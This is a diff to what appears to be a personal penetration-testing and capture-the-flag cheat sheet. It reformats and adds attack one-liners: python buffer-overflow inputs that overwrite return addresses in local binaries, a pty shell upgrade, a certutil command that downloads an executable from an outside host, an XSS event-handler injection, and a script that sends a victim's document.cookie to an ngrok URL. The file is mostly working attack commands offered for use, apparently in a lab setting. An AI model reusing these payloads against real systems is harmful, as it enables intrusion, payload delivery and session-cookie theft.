@@ -40,8 +40,12 @@ x86 chr() to write hexa
  - (python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat ) | ./ch16
 
 examples:
-- { python -c 'from struct import pack; print "B" * 280 + pack("<Q", 0x400556)'; cat } | ./binaire 
-- ( python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat) | binaire
+```
+{ python -c 'from struct import pack; print "B" * 280 + pack("<Q", 0x400556)'; cat } | ./binaire 
+```
+```
+( python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat) | binaire
+```
 
 # REVERSE SHELL
 ```
@@ -61,6 +65,8 @@ personal initialization file ~/.bashrc if the shell is interactive.  This option
 by default if the shell is invoked as sh.
 
 # PRIVESC
+
+### LINUX
 Get proper TTY shell
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -104,7 +110,12 @@ Start a bash without a profile
 ```
 sh -i /home/nobody/.ssh/ssh_key USER@IP -t bash --noprofile --norci  
 ```                                                                 
+### WINDOWS
 
+Download file PowerShell
+```
+certutil -urlcache -f http://10.10.14.28:8000/41020.exe 41020.exe
+```
 # CRYPTO
 ```
 cat file | 
@@ -120,9 +131,11 @@ openssl enc -in LEFICHIERDENTREE -out LEFICHIERDESORTIE -d -AES-256-CBC -md sha2
 
 # XSS
 ```
-"onfocus="alert(1)"autofocus="
+'onfocus="alert(1)"autofocus='
 ```
+
 ## NGROK
+
 ```
 <script>window.location.href='http://ngrok.io/?cookie='%2bdocument.cookie</script>
 ```
